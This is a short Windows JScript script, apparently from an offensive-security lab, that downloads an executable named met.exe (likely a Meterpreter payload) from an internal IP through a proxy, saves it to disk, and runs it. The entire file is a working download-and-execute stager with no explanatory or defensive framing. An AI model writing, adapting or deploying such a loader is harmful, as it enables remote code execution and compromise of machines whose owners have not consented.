var url = "http://192.168.45.173/met.exe"
var Object = WScript.CreateObject('MSXML2.ServerXMLHTTP');

// Set Proxy http://proxyServerAddress:proxyPort
Object.setProxy(2, "http://192.168.221.12:3128", "");
Object.open('GET', url, false);
Object.send();

if (Object.status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.responseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");